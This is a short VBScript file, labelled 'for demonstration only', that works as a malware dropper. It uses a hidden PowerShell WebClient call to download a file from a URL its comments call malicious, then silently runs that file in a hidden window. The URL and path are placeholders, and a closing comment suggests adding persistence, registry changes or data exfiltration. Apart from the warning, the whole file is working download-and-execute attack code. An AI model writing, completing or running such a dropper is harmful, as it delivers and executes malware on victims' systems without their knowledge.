' WARNING: This script is for demonstration only. 
' DO NOT run on any system without proper authorization.

Option Explicit

Dim url, savePath, shell, command

' URL pointing to a malicious file
url = "public hosted file"

' Local path where the file will be saved
savePath = "local path"

' Create a Shell object
Set shell = CreateObject("WScript.Shell")

' Command to download the file using PowerShell
command = "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & savePath & "')"""

' Download the file (hidden window, waits until download completes)
shell.Run command, 0, True

' Execute the downloaded file (hidden window, does not wait)
shell.Run """" & savePath & """", 0, False

' Optional: You could add persistence, registry modification, or data exfiltration
